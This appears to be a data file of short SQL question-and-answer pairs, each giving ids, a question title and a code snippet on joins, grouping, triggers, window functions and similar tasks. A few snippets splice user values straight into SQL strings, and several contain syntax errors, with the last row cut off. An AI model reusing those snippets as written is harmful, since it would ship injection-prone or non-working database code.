"
4047,35999,How to get total count of orders placed on spesific date using Raw query,"SELECT COUNT(*)
FROM TABLE_NAME
WHERE DATE_COL = 'YOUR_DATE'
"
28234,62136,SQL advanced compare of strings,"SELECT * FROM (
  SELECT 
     receivedate, 
     swp.firmwarelevel AS 'Firmwarelevel',
     pa.description AS 'Description',
     row_number() over (partition by Description order by receivedate desc) rn
 FROM tbl_swapgroup_parts swp, 
      tbl_parts pa, 
      tbl_part_type pt, 
      tbl_swapgroups sw, 
      tbl_workorders wo 
 WHERE custom7 = 'somemodel' 
     AND swp.swapgroup_id IN (18,25) 
     AND sw.id = swp.swapgroup_id 
     AND pa.id = swp.part_id 
     AND pt.id = pa.parttype_id 
     AND wo.part_id = pa.id
) x
where x.rn=1
"
25817,61059,How implement one-to-many objects database in sqlite for android,"SELECT u.User_ID, u.Name, p.Time, p.Message
FROM Users u INNER JOIN Posts p ON u.User_ID = p.User_ID
"
13570,5104,Join condition in mysql need to ignore null field,"SELECT 
  post.*, 
  post_image.name AS img 
FROM post
LEFT JOIN post_image ON post_image.postId = post.id 
LIMIT 10;
"
24559,28950,I need help formulating two simple triggers utilizing two different tables,"CREATE TRIGGER [dbo].[trReorder]
   ON  [dbo].[Products]
   AFTER INSERT, UPDATE
AS 
BEGIN

    SET NOCOUNT ON;

    IF EXISTS(  SELECT p.ProductID 
                FROM Products p 
                INNER JOIN inserted i 
                ON p.ProductID = i.ProductID
                WHERE p.ProductID = i.ProductID 
                AND p.QtyOnHand <= p.ReorderAmount)
    BEGIN

        INSERT INTO dbo.Reorders
        SELECT p.ProductID, p.ReorderAmount, GETDATE()
        FROM Products p
        INNER JOIN inserted i
        ON p.ProductID = i.ProductID
        WHERE p.ProductID = i.ProductID
        AND p.ProductID NOT IN (SELECT ProductID FROM dbo.Reorders)

    END

END


CREATE TRIGGER [dbo].[trDelReorder]
   ON  [dbo].[Products]
   AFTER INSERT, UPDATE
AS 
BEGIN

    SET NOCOUNT ON;

    IF EXISTS(  SELECT p.ProductID 
                FROM Products p 
                INNER JOIN inserted i 
                ON p.ProductID = i.ProductID
                WHERE p.ProductID = i.ProductID 
                AND p.QtyOnHand > p.ReorderAmount)
    BEGIN

        DELETE 
        FROM dbo.Reorders
        FROM dbo.Reorders r
        INNER JOIN inserted i
        ON r.ProductID = i.ProductID

    END

END
"
38494,55383,SQL query to get product sales by category for each month,"SELECT 
YEAR(o.OrderDate) as [Sales Year],
MONTH(o.OrderDate) as [Sales Month],
SUM(case when c.catid = 1 then o.TotalAmount else 0 end) AS [Dispenser Sales],
SUM(case when c.catid = 2 then o.TotalAmount else 0 end) AS [Refill Sales]
FROM Orders o
join orderdetails od on o.order_id = od.orderid
join store s on s.pro_id = od.pro_id
join category c on c.catid = s.catid
GROUP BY YEAR(o.OrderDate), MONTH(o.OrderDate)
ORDER BY YEAR(o.OrderDate), MONTH(o.OrderDate)
"
30319,2251,SQL query to get list of months start from current month,"DECLARE @YEAR INT
SET @YEAR = (SELECT YEAR(GETDATE()))
DECLARE @MONTH INT
SET @MONTH = (SELECT MONTH(GETDATE()))

DECLARE @DT TABLE(ID INT, MONTHNAME NVARCHAR(20))

INSERT INTO @DT SELECT NUMBER AS ID,
   DATENAME(MONTH, CAST(@YEAR*100+NUMBER AS VARCHAR) + '01')  AS MONTHNAME
FROM MASTER.DBO.SPT_VALUES   
WHERE TYPE = 'P' AND  
  NUMBER BETWEEN @MONTH AND 12

INSERT INTO @DT SELECT NUMBER AS ID,
   DATENAME(MONTH, CAST(@YEAR*100+NUMBER AS VARCHAR) + '01')  AS MONTHNAME

FROM MASTER.DBO.SPT_VALUES   
WHERE TYPE = 'P' AND  
  NUMBER BETWEEN 1 AND @MONTH -1

SELECT * FROM @DT 
"
11296,11163,Tree depth in SQL,"WITH RECURSIVE node_ancestors(node_id, parent_id) AS (
        SELECT id, id FROM tree_node WHERE id IN (1, 2, 3)
    UNION ALL
        SELECT na.node_id, tree_node.parent_id
            FROM node_ancestors AS na, tree_node
            WHERE tree_node.id = na.parent_id AND tree_node.parent_id IS NOT NULL
)
SELECT node_id, COUNT(parent_id) AS depth FROM node_ancestors GROUP BY node_id;
"
15961,57634,Select multiple values from multiple rows,"SELECT 
  ProductID,
  GROUP_CONCAT(Variantno)
FROM tbl
GROUP BY ProductID
"
27185,75148,SQL sum field when column values match,"SELECT SUM(Value) AS 'Total', [Product Name]
FROM TableX  
GROUP BY [Product Name]
"
18612,37878,How to make for loop in windows batch file run in name order,"for /f ""tokens=*"" %%s in ('dir /b *.sql ^| sort') do echo %%s
"
637,46466,Get Last Unique Row,"SELECT *
FROM (SELECT *,ROW_NUMBER() OVER(PARTITION BY Request ORDER BY Id DESC)'RowNum'
      FROM YourTable
      )sub
WHERE RowNum = 1
"
28213,65869,Escaping a single quote in Oracle regex query,"select * 
  from dm_name 
  WHERE regexp_like(last_name, '([^A-Za-z ''-])');
"
1399,12287,Oracle SQL - Calculating Performance Indicators,"select 
  NVL(ROUND(100*((STATUS1+STATUS2)/NULLIF(TOTAL2,0)),2),0) as kpi1,
  ... ,
  ... ,
  ... ,
from (
    with data as (
      select * from table
      where year between 2015 and 2016
         or status in ('B','C')
    )
    select
      count(case when year=2015 then 1 else NULL end) as total2,
      count(case when year=2016 then 1 else NULL end) as total3,
      count(case when status='C' then 1 else NULL end) as status1,
      count(case when status='B' then 1 else NULL end) as status2
    from data
);
"
20038,56522,mysql query not returning all results when using case,"select s.name,s.id,s.level,
CASE WHEN g.photo_url IS NULL THEN 'no-image.png'  
ELSE g.photo_url END 
AS photo_url  
from sub_category s
left join gallery g 
on g.main_id=s.id 
on g.type_id='9' 
where s.category_id='2' 
and s.level='1'
"
33612,30514,apply an if condition in a sql query,"CASE WHEN IFNULL(birth_date,0)=0 THEN '' ELSE YEAR(CURDATE()) - YEAR(birth_date) END as age
"
23656,26047,How can I find all the db trigger in phpMyAdmin?,"SHOW TRIGGERS
"
9954,38576,SQL query for finding row with same column values that was created most recently,"select pp.id
from people pp, (select name, max(created) from people group by name) p
where pp.name = p.name
and pp.created = p.created
and id not in ( select person_id from hobbies )
"
9700,35593,How to get value without subqueries (on SQL-Server)?,"select cast(sum(distinct Num + cast(0.00001 as number(38,19))/ID) as number(18,2))
"
35485,40374,MVC Controller Create New Record,"card.Guid = Guid.NewGuid();
"
6414,37334,Getting output in a variable from dynamic SQL,"declare @stmt nvarchar(max), @Data xml, @searchstring nvarchar(max)

select @stmt = '
    select @Data = (
        select id
        from Table1
        where ' + @searchstring + '
        for xml raw(''Data'')
    )
'

exec sp_executesql
    @stmt = @stmt,
    @params = N'@Data xml output',
    @Data = @Data output

select
    T.C.value('@id', 'int') as id
from @Data.nodes('Data') as T(C)
"
37502,68173,Oracle REGEXP- How do I get the next string,"THEN regexp_replace(name, '.*having ([^ ]+).*', '\1')
"
11678,25269,Two-way encryption + look-up?,"SELECT ...
FROM yourtable
WHERE encrypted_email = AES_ENCRYPT('someone@example.com', 'crypt key here');
"
15513,59124,Select time in and time out from fingerprint transaction table according shiftperiod table,"select  PeriodId from shifts 
where EmployeeCode  = @employeecode 
and datefrom <= @INDat and dateto  >= @INDat
order by abs((cast(DATEPART(HOUR,timein) as int))-(cast(DATEPART(HOUR,@INDat) as int)))
"
26655,9228,How to Average a column of results in sql query,"SELECT         
   dtCreated, bActive, dtLastUpdated, dtLastVisit,  
   DATEDIFF(d, dtCreated, dtLastUpdated) AS Difference,
   AVG(DATEDIFF(d, dtCreated, dtLastUpdated)) OVER() AS AvgDifference
FROM  
   Customers 
WHERE         
   (bActive = 'true')  
   AND (dtLastUpdated > CONVERT(DATETIME, '2012-01-01 00:00:00', 102)) 
"
26708,24440,SQL Server 2012 Date Change,"select convert(varchar(10), creat_dttm, 101)
from yourTable
"
38145,7034,Change Large Number of Record Keys using Map Table,"update (select id,
               newid
          from old_to_new,
               my_table
         where my_table.id = old_to_new.oldid)
set id = newid
"
19217,2584,"UTF-8 tuple storage using lowest common technological denominator, append-only","U+0009 CHARACTER TABULATION becomes ~TB
U+000A LINE FEED            becomes ~LF
U+000D CARRIAGE RETURN      becomes ~CR
U+007E TILDE                becomes ~~~
etc.
"
15971,7164,Find duplicated values on array column,"SELECT v AS value_repeated,array_agg(id) AS is_repeated_on FROM 
(select id,unnest(array) as v from my_table) 
GROUP by v HAVING Count(Distinct id) > 1
"
26227,62899,Select Count with trimmed rows," with cte
    as
    (
    select row_number() over(partition by part_sys_id order by sys_created desc) as ri,part_sys_id, old_status, new_status, sys_created
    from Vhw_status_journal
    where i = 5
    )

    select count(*) from cte where ri=1 and new_status=2
"
25050,10512,How can I fill a table column with sequential values?,"UPDATE tt_calendar c1
SET tt_taskindex=(SELECT COUNT(*) FROM tt_calendar c2 
WHERE c2.tt_calendar_id < c1.tt_calendar_id)+1
"
9926,48844,How to join table A to B to find all the entries in A whose intervals contain entries in B?,"select *
from a left join
     b
     on a.userID = b.userID and
        (a.date1<=b.date1 or a.logID1<=b.logID1)
        (a.date2>=b.date2 or a.logID2>=b.logID2);
"
29917,18769,sql insert into lookup tables' association tables,"insert into LookUpTable1_AssociationTable1 ([LookupId],[AssociationId])
select 
    l.Id as LookupId
    ,a.Id as AssociationId 
from
    LookupTable1 l
    cross join Association a
"
14760,38049,Merge two SQL script use if condition in Select query,"SELECT [Fm].[Id], [Sdp].[FirstName], [Sdp].[LastName], [Sdp].[SSN],
[Sdp].[StoreName],
case when isnumeric([Sdp].[PostalCode]) = 1 then [Sdp].[PostalCode] else 0 end,
[Fc].[Id], [Sdp].[Address]
FROM [SRM].[SiteMembers].[DProfile] AS [Sdp]
INNER JOIN [SRM].[SiteMembers].[Member] AS [Sm]
ON [Sdp].[Member_Id] = [Sm].[Id]
INNER JOIN [FRM].[Members].[Member] AS [Fm]
ON [Sm].[UserId] = [Fm].[UserId]
INNER JOIN [SRM].[General].[City] AS [Sc]
ON [Sdp].[City_Id]=[Sc].[Id]
INNER JOIN [FRM].[General].[City] AS [Fc]
ON [Fc].[Title]=[Sc].[Title] 
COLLATE SQL_Latin1_General_CP1_CI_AS
"
26180,43212,Mysql query - Group By one field and ordering by another,"SELECT member_id, FROM_UNIXTIME(MAX(stamp)) AS log_time
FROM logins
GROUP BY member_id
ORDER BY stamp DESC
"
25899,14901,SQL - Get column value based on another column's average between select rows,"select t1.DateValueField, t1.Hour, t2.avg_value
from MyTable t1
join (
    select DateValueField, avg(Value) avg_value
    from MyTable
    where hour between 6 and 12
    group by DateValueField
) t2 on t2.DateValueField = t1.DateValueField
order by t1.DateValueField, t1.Hour
"
23181,7173,How to get total number of products in virtuemart?,"SELECT O.product_id,
       SUM(O.product_quantity) as Total_Sold
  FROM jos_vm_order_item O
 GROUP BY O.product_id
"
650,39702,Script SQL Login and User Mappings,"USE master
GO
CREATE LOGIN SomeLogin --FROM WINDOWS?
GRANT CONNECT SQL TO SomeLogin
GO
USE MYDB
GO
CREATE USER SomeUser FOR LOGIN SomeLogin
GRANT CONNECT TO SomeUser 
GO
CREATE ROLE SomeRole AUTHORIZATION [dbo]
GO
EXEC sp_addrolemember 'SomeRole', 'SomeUser'
GO
"
12312,7202,MySQL update join with limit,"UPDATE wp_postmeta t JOIN
(
    SELECT p.meta_id, m.newmap
      FROM wp_postmeta p JOIN wp_map m
        ON p.meta_value = m.oldmap
     ORDER BY p.meta_id
     LIMIT 100
) s
   ON t.meta_id = s.meta_id
  SET t.meta_value = s.newmap;
"
10497,73020,File tree in OracleSQL,"SELECT LPAD(' ', (level-1)*2) || name
FROM (
  SELECT id_f, name, parent FROM folders
  UNION ALL
  SELECT NULL, name, parent FROM files
  )
START WITH parent IS NULL
CONNECT BY parent = PRIOR id_f
"
3265,13488,Filter result set based on particular column value in SQL,"select * from product_table
where product_id in
(
  select product_id
  from product_table
  group by product_id
  having max(price) = avg(price)
)
"
31228,59890,next available value - postgresql,"select substring(to_char(n,'000') from 2) as num
from generate_series(1,9) gs(n)

except

select co_clno
from co

order by 1
limit 1
"
16547,30293,"SQL unionall, null","SELECT CASE WHEN rnk = 1 THEN MAKER ELSE '' END AS Mkr, type, rnk 
FROM Table1
ORDER BY MAKER,RNK
"
33286,34797,SQL to retrieve thickness values with small variance,"select * 
from table t1
join table t2 on t1.substid < t2.substid
join table t3 on t2.substid < t3.substid
where abs(t1.thickness - t2.thickness) <= 3 and
      abs(t1.thickness - t3.thickness) <= 3 and
      abs(t2.thickness - t3.thickness) <= 3
"
13009,34749,SQL - Sum of a subquery: What are I am doing wrong?,"SELECT CM.CUSTOMER_ID,
    CM.NAME ,
    CB.Bonus_ID,
    cb.Amount,
    SUM(cbi.Amount)
FROM CUSTOMER_MAPPING CM
INNER JOIN CUSTOMER_BONUS CB
ON CM.CUSTOMER_ID=CB.CUSTOMER_ID
INNER JOIN CUSTOMER_BONUS_TO_INVOICE CBI
ON cbi.Bonus_ID=cb.Bonus_ID
GROUP BY CM.CUSTOMER_ID,
    CM.NAME,
    CB.BONUS_ID,
    cb.Amount;
"
1255,14938,"SQL case sensitive string comparison with like and ""=""","SELECT * FROM category WHERE upper(cat_name) = upper('Test')
"
10189,32493,"Join Tables Based on Correlated Subquery, SQL","SELECT
   T1.*,
   T2.*
FROM Table1 as T1
JOIN (
   SELECT 
      ID, MAX(Date) as Date
   FROM Table1
   GROUP BY 
      ID
) as Last ON
   T1.ID = Last.ID
   AND T1.Date = Last.Date
LEFT OUTER JOIN Table2 as T2 ON
   T1.ID = Last.ID
   AND MONTH(T1.Date) = MONTH(T2.Date)
   AND YEAR(T1.Date) = YEAR(T2.Date)
"
3803,64851,Count Wordpress posts by year with SQL,"SELECT COUNT(*)
FROM wp_posts
WHERE YEAR(post_date) = 2010
AND post_type = 'post'
AND post_status = 'publish'
"
23253,11448,Mysql issue with group by two columns,"SELECT   driver, SUM(points)
FROM     (SELECT driver1 AS driver, points FROM example_table
          UNION ALL
          SELECT driver2 AS driver, points FROM example_table) t
GROUP BY driver
ORDER BY 2 DESC
"
29506,68958,Inserting multiple rows with SQL where a record does not exist,"REPLACE INTO conversion (user_id,url_id,order_id,sale,commission,transaction_date,process_date) VALUES (1,1,3,'32',0.3995,'2010-11-15 12:50:31','2010-11-15 12:50:31'),(1,2,2,'*not-available*',0.001975,'2010-11-15 12:50:31','2010-11-15 12:50:31');
"
37229,40897,How to insert a record in many to many relationship tables?,"alter table teacher_student
   add constraint s_t_fk_t foreign key (T_Id)
   references teachers (id)
   on delete cascade
   on update cascade;

alter table teacher_student
   add constraint s_t_fk_s foreign key (S_Id)
   references students (id)
   on delete cascade
   on update cascade;
"
22982,61760,"SQL REPLACE function, how to replace single letter","REPLACE(REPLACE(cc.contype,'y','z'),'x','y') as ContractType
"
3209,63893,INSERT INTO specific ROW - Insert into specific columns of a specific row?,"UPDATE  tableName
SET     c4 = 'newVal',
        c5 = 'newvla2'
WHERE   c1 = 'val1' AND
        c2 = 'val2' AND
        c3 = 'val3'
"
34198,32775,Use modulo to calculate period?,"Select  Course,
        Avg(TimeToCompleteCourse) As AvgTimeToComplete,
        Convert(VarChar(4), Ceiling(Avg(TimeToCompleteCourse) / 3.0) * 3 - 2)
        + ' - ' +
        Convert(VarChar(4), Ceiling(Avg(TimeToCompleteCourse) / 3.0) * 3)
        + ' Months' As Category
From    YourTableName
Group By Course
"
22189,14806,SQL Server: A Grouping question that's annoying me,"SELECT * FROM employees_paid where Month not in (
     SELECT
          a.Month
     FROM
          employees_paid a
          INNER JOIN employees_paid b ON 
               (a.employee = B.employee AND 
               a.PercentOfTotal = b.PercentOfTotal AND 
               a.Month > b.Month)
     GROUP BY
          a.Month,
          b.Month
     HAVING
          Count(*) = (SELECT COUNT(*) FROM employees_paid c 
               where c.Month = a.Month)
     )
"
29679,19668,Optimizing a nested join window function for a large Postgresql table,"select column1, column2,
       ast_value( a.column3) OVER (PARTITION BY column2, column1 order by start_time ASC
                                   RANGE BETWEEN unbounded preceding and unbounded following
                                  ) as column3,
       column4, column5, column6
from (select a.column1, a.column2, a.start_time,
             rank() OVER (PARTITION BY a.column2, a.column1 order by a.start_time DESC
                         ) as rank,
            a.column3, a.column4, a.column5, a.column6
      from (table2 s INNER JOIN
            table3 t
            ON s.column2 = t.column2 and s.event_time > t.start_time
           ) a
     ) b
where rank = 1
"
30532,2299,Creating a feed (following) grouped by day and user that is ordered by most recent on ruby on rails,"current_user_id = current_user.id

Photo.select(%q{
  user_id, 
  COUNT(*) no_photos, 
  date_trunc('day', created_at::timestamp) as what_day
}).group(""what_day, user_id"").order(""what_day DESC"").where(%Q{
  user_id IN (
    (SELECT followable_id FROM follows where follower_id = #{current_user_id})
    UNION ALL
    (SELECT #{current_user_id} as followable_id)
  )
})
"
8194,75293,SQL swap field values,"UPDATE swap_test 
SET x=(@temp:=x), 
    x = y, 
    y = @temp
WHERE ...
"
38588,45431,MSSQL - Remove all text after a '-' in a varchar field,"update your_table
set col_new = case when charindex('-', col) > 0 
                   then RTRIM(left(col, charindex('-', col) - 1))
                   else col
              end
"
34614,63351,oracle sql totalize days for contiguos ranges,"SQL> create table tmp$dates (d_start date, d_end date);

Table created

SQL> insert into tmp$dates values (DATE '2014-02-01', DATE '2014-02-05');

1 row inserted

SQL> insert into tmp$dates values (DATE '2014-02-06', DATE '2014-02-11');

1 row inserted

SQL> insert into tmp$dates values (DATE '2014-03-22', DATE '2014-03-25');

1 row inserted

SQL> insert into tmp$dates values (DATE '2014-04-02', DATE '2014-04-10');

1 row inserted

SQL> insert into tmp$dates values (DATE '2014-04-11', DATE '2014-04-20');

1 row inserted

SQL> select min(d_start), max(d_end), max(d_end) - min(d_start) + 1 n#
  2  from tmp$dates d
  3  start with d_start not in (select d_end + 1 from tmp$dates)
  4  connect by prior d_end = d_start - 1
  5  group by level - rownum
  6  order by 1;

MIN(D_START) MAX(D_END)          N#
------------ ----------- ----------
01.02.2014   11.02.2014          11
22.03.2014   25.03.2014           4
02.04.2014   20.04.2014          19
"
1310,57454,How to clone all specific record and modify one of the columns,"INSERT INTO language (language_id,key_value,key_text)
SELECT 'FR' as language_id, key_value, key_text 
FROM language  WHERE language_id='EN' 
"
13152,21883,"creating duplicate entries in db error in rails, likely form submission error","rake assets:clean
"
15915,46862,Data Converted to BigInt contains Decimal with E Proceeding with Plus sign,"DECLARE @foo TABLE (Id int, Wrong varchar (250), Correct bigint);
DECLARE @bignumber bigint = 12345678901234567;
DECLARE @bignumber2 float = 12345678901234567;
DECLARE @bignumber3 varchar(250) = '12345678901234567';

SELECT @bignumber;

INSERT @foo VALUES (1, @bignumber, @bignumber);
INSERT @foo VALUES (2, @bignumber2, @bignumber2);
INSERT @foo VALUES (3, CAST(@bignumber2 AS bigint), CAST(@bignumber2 AS bigint));
INSERT @foo VALUES (4, @bignumber3, @bignumber3);
INSERT @foo VALUES (5, CAST(@bignumber3 AS bigint), CAST(@bignumber3 AS bigint));

SELECT * FROM @foo;
"
16298,61986,To find updated column list and data using CDC,"With Cte_CDC as (SELECT ID,FieldName,FieldValue,StartDate=CreatedDate,EndDate 

=ModifiedDate
from 
(
Select ID,Col1,Col2,Col3,Col4,Col5,CreatedDate,ModifiedDate 
FROM cdc.mssqlserver2012_ct
) a
Unpivot
(
FieldValue for FieldName in (Col1,Col2,Col3,Col4,Col5)
) Upt)


select distinct a.ID,a.FieldName,a.FieldValue,ISNULL(a.EndDate,a.StartDate) as Startdate,b.EndDate
from Cte_CDC a
join Cte_CDC b on a.ID=b.ID and a.FieldName=b.FieldName and a.FieldValue<>b.FieldValue
order by 1,2

ID  FieldName   FieldValue  Startdate   EndDate
1   Col1    A   2014-08-20 15:09:40.560 2014-08-20 15:11:34.863
1   Col1    A   2014-08-20 15:09:40.560 2014-08-20 15:12:46.117
1   Col1    A   2014-08-20 15:09:40.560 2014-08-20 15:18:15.973
1   Col1    A_U 2014-08-20 15:11:34.863 NULL
1   Col1    A_U 2014-08-20 15:11:34.863 2014-08-20 15:12:46.117
1   Col1    A_U 2014-08-20 15:11:34.863 2014-08-20 15:18:15.973
1   Col1    A_U_UV  2014-08-20 15:12:46.117 NULL
1   Col1    A_U_UV  2014-08-20 15:12:46.117 2014-08-20 15:11:34.863
1   Col1    A_U_UV  2014-08-20 15:12:46.117 2014-08-20 15:18:15.973
1   Col1    A_U_UV_UVX  2014-08-20 15:18:15.973 NULL
1   Col1    A_U_UV_UVX  2014-08-20 15:18:15.973 2014-08-20 15:11:34.863
1   Col1    A_U_UV_UVX  2014-08-20 15:18:15.973 2014-08-20 15:12:46.117
2   Col2    G   2014-08-20 15:09:40.560 2014-08-20 15:11:34.877
2   Col2    G_V 2014-08-20 15:11:34.877 NULL
3   Col3    M   2014-08-20 15:09:40.560 2014-08-20 15:11:34.877
3   Col3    M_A 2014-08-20 15:11:34.877 NULL
3   Col4    N   2014-08-20 15:09:40.560 2014-08-20 15:11:34.877
3   Col4    N_B 2014-08-20 15:11:34.877 NULL
"
10676,8846,"MySQL, if a value is in one of two columns, return the value from the other one","SELECT user1 FROM TAB WHERE user2=id
UNION ALL
SELECT user2 FROM TAB WHERE user1=id
"
18454,17693,Postgres ANTI-JOIN needs Table-Scan?,"CREATE TABLE tl (i int, t text);
CREATE TABLE tr (i int, t text);
INSERT INTO tl SELECT s, 'text ' || s FROM generate_series(1,999999) s;
INSERT INTO tr SELECT s, 'text ' || s FROM generate_series(1,999999) s WHERE s % 3 = 0;
ALTER TABLE tl add primary key (i);
CREATE INDEX tr_i_idx ON tr (i);
ANALYSE;
EXPLAIN ANALYSE SELECT i,t FROM tl LEFT JOIN tr USING (i) WHERE tr.i IS NULL;
                                                         QUERY PLAN                                                      
-----------------------------------------------------------------------------------------------------------------------------
 Merge Anti Join  (cost=0.95..45611.86 rows=666666 width=15) (actual time=0.040..4011.970 rows=666666 loops=1)
   Merge Cond: (tl.i = tr.i)
   ->  Index Scan using tl_pkey on tl  (cost=0.00..29201.32 rows=999999 width=15) (actual time=0.017..1356.996 rows=999999 lo
   ->  Index Scan using tr_i_idx on tr  (cost=0.00..9745.27 rows=333333 width=4) (actual time=0.015..439.087 rows=333333 loop
 Total runtime: 4602.224 ms
"
39220,46371,Sort Data based on uniqueidentifier data type column,"SELECT SubjectName, ParentID, SubjectID, SID
FROM yourTable
ORDER BY ParentID
"
16471,73332,PHP MySQL Group By question,"SELECT COUNT(customerid) AS `count`,
    datecreated,
    SUM(`recordtype` = 'C') AS CountOfC,
    SUM(`recordtype` = 'L') AS CountOfL
FROM `tbl_customers` 
WHERE `datecreated` BETWEEN '$startdate.""' AND '"".$enddate.""' 
GROUP BY `datecreated` ASC
"
38103,51577,Insert a row into table A whenever a row is inserted into table B,"CREATE TRIGGER new_student_trigger ON student
AFTER INSERT AS
BEGIN
   INSERT INTO new_stud (student_id)
   SELECT student_id FROM inserted;
END
"
17674,30155,MySQL getting count of a related table,"SELECT s.id AS SessionId, COUNT(DISTINCT sv.id) AS SessionVisits, COUNT(sr.ID) AS Searches
FROM sessions s
  LEFT JOIN session_visits sv
  ON s.id = sv.session_id
  LEFT JOIN searches sr
  ON sr.session_visit_id = sv.id
GROUP BY s.id;
"
35603,62319,Count of other rows in table with the same value,"SELECT t1.*,
  (SELECT COUNT(1)
  FROM mytable t2
  WHERE t2.`room number` = t1.`room number`
  )
FROM mytable t1
"
20274,5327,SQL query involving three tables and checking whether some result has entry in another table,"    select u2.UserID, u2.EID, u2.Name, u2.Email, u2.Department, u2.Enabled, 
           s.SiteID, s.SiteCode, s.SiteName
    from users2 u2
        left outer join usersites us on u2.UserID = us.UserID 
        left outer join sites s on s.SiteID = us.SiteID 
    where u2.EID = 12345  and us.SiteID = 2
"
32860,12725,SQL query that returns aggregate AND non aggregate results,"select s.name
     , s.weight
     , ((s.weight/st.avgweight) * 100) as weight_apgaw
     , ((s.height/st.avgheight) * 100) as weight_aphei
from student s 
join (
   select grp_id
        , avg(weight) as avgweight
        , avg(height) as avgheight
   from student
   group by grp_id
   ) st on s.grp_id = st.grp_id
"
32324,12582,Joining three tables together based on common ids,"SELECT 
    c.ID, c.post_title, a.name
FROM 
    wp_tylerposts c
LEFT JOIN
    wp_tylerterm_relationships b
ON
    c.ID = b.object_id
LEFT JOIN
    wp_tylerterms a
ON
    b.term_taxonomy_id = a.term_id
WHERE
    c.post_type = 'sponsor'
"
14348,26992,how to select sum of column based on date,"SELECT SUM(value) AS value_today FROM table_value WHERE date = CURDATE()
"
17111,55340,SQL Server DateTime Intervals,"SELECT 
    DATEFROMPARTS(YEAR(TimeStampByNode), MONTH(TimeStampByNode), DAY(TimeStampByNode)), 
     -- Start --
    ROUND(AVG(CASE WHEN DATEPART(HH, TimeStampByNode) < 12 
          THEN Value ELSE NULL END), 2) as AVG_AM,
    ROUND(AVG(CASE WHEN DATEPART(HH, TimeStampByNode) >= 12 
          THEN Value ELSE NULL END), 2) as AVG_PM
    -- End --
FROM 
    data_record2 
WHERE 
    Node_ID = 55554321 AND Value_Type = 'Activity'
GROUP BY 
    DATEFROMPARTS(YEAR(TimeStampByNode), MONTH(TimeStampByNode), DAY(TimeStampByNode))
ORDER BY  
    DATEFROMPARTS(YEAR(TimeStampByNode), MONTH(TimeStampByNode), DAY(TimeStampByNode)) DESC
"
35126,31740,Fuzzy (Like) Join not working,"on (a.t like '%' + b.t + '%') or
   (b.t like '%' + a.t + '%')
"
8396,9303,"MySQL sub-queries, views, and procedures; which (if any) are correct?","CREATE VIEW your_view AS
   SELECT b.board_id
          COUNT(p.post_id) AS post_count,
          ROUND(AVG(TIME_TO_SEC(TIMEDIFF(NOW(), p.created_on)) / 3600), 3) AS post_age_avg,
          ROUND(AVG(p.rating), 3) AS post_rating_avg,
          ROUND(TIME_TO_SEC(TIMEDIFF(NOW(), b.created_on)) / 3600, 3) AS board_age,
          ROUND(1 - (AVG(TIME_TO_SEC(TIMEDIFF(NOW(), p.created_on)) / 3600) / TIME_TO_SEC(TIMEDIFF(NOW(), b.created_on)) / 3600), 3) AS board_usage,
          ROUND(COUNT(p.*) / (TIME_TO_SEC(TIMEDIFF(NOW(), b.created_on)) / 3600), 3) AS board_rating
     FROM BOARD b
LEFT JOIN POST p ON p.board_id = b.board_id
 GROUP BY b.board_id
"
16159,43988,How to see and kill a list of sessions being made to an ORACLE schema?,"-- 1. Check connected sessions
select     sid, serial#, username, machine,
    to_char(logon_time+5/24,'ddMon hh24:mi') login,
    SQL_HASH_VALUE, PREV_HASH_VALUE,
    status
from  v$session
where
lower(username) like  '%SCHEMA_NAME%'
--and lower(status) not like '%killed%'
--and machine like '%SOURCE_MACHINE_NAME%'
order      by logon_time;

-- 2. Same as above, but just show the count of sessions  
select    count(1)
from      v$session
where      lower(username) like  lower('%SCHEMA_NAME%')
--and lower(status) not like '%inactive%'
order      by logon_time;


-- 3. Kill connected sessions
ALTER SYSTEM ENABLE RESTRICTED SESSION;
begin
    for x in (
            select Sid, Serial#, machine, program
            from v$session
            where      lower(username) like  '%SCHEMA_NAME%'
        ) loop
        execute immediate 'Alter System Kill Session '''|| x.Sid
                     || ',' || x.Serial# || ''' IMMEDIATE';
    end loop;
end;
ALTER SYSTEM DISABLE RESTRICTED SESSION;
-- May have to wait for a bit for the killed sessions to be cleaned up
"
23363,74851,SUM until a certain point,"select t.item, t.transaction_date, t.adj_qty, 
       sum(tprev.adj_qty) as CumSum
from t t join
     t tprev
     on t.item = tprev.item and
        t.transaction_date >= tprev.transaction_date
group by t.item, t.transaction_date, t.adj_qty
having 100 between sum(tprev.adj_qty) -t.adj_qty + 1 and sum(tprev.adj_qty)
"
22302,13281,How to get values from three different tables in SQL Server with primary key and without?,"SELECT tb1.pod, tb1.origin, tb1.destination, tb1.town, tb3.area
FROM Table1 as tb1
JOIN Table2 as tb2
ON tb1.town = tb2.town
JOIN Table3 as tb3
ON tb3.town_id = tb2.town_id
"
4399,406,How to use for loop scenario in sql server,"    SELECT MSchoolDetails.* 
      FROM MLTalukDetails
INNER JOIN MSchoolDetails ON MTalukDetails.l_t_id = MSchoolDetails.L_T_Id
     WHERE MLTalukDetails.L_D_ID = 4 AND MSchoolDetails.Y_Id=@yearid
"
6875,29056,Comparing two rows in a table,"select count(distinct professorID) as prof_count
from vorlesungen
where nameOfTheLecture in ('Logik','Erkenntnistheorie')
"
10947,18568,Moving average in SQL,"SELECT consumption_month, 
  AVG(b.power_consumption)
FROM 
(
    SELECT DISTINCT DATE_FORMAT(`date`, '%Y%m') AS consumption_month FROM consumption_table a
) a
INNER JOIN consumption_table b
ON consumption_month >= DATE_FORMAT(b.`date`, '%Y%m')
WHERE b.`date` >= '2014/04/01'
GROUP BY consumption_month
"
31461,29315,Inserting from a SELECT but changing one column?,"    DECLARE
    CURSOR CUR_D IS
      SELECT *
      FROM TABLE
      WHERE id = some id;
    ROW_D CUR_D%ROWTYPE;

    BEGIN
      OPEN CUR_D;
      FETCH CUR_D INTO ROW_D;
      CLOSE CUR_D;

      ROW_D.column := 'some data';

      INSERT INTO some table
      VALUES ROW_D;

    END;
    /
"
31944,62163,SQL DB Design for product builder,"Products - idProduct, type (Regular / Parent / Child)
Product_Attributes - idAttribute, idProduct
Product_Attributes_Values - idValue, idAttribute, value, idProduct
"
9346,43088,SQL: Help with a nested queries,"SELECT s.*
  FROM SUPPLIER s
  JOIN (SELECT c.sid,
               COUNT(c.pid) AS num_parts
          FROM CATALOG c
      GROUP BY c.sid) x ON x.sid = s.sid
  JOIN (SELECT COUNT(*) AS total_parts
          FROM PARTS) y ON y.total_parts = x.num_parts
"
3630,75379,SQL Query to limit rows within a group,"select t.*
from (select t.*, row_number() over (partition by date order by date) as seqnum
      from table t
     ) t
where seqnum <= 5;
"
39003,51846,update mysql column from another table column only if the autoincrement data is equal,"UPDATE `table1` as a
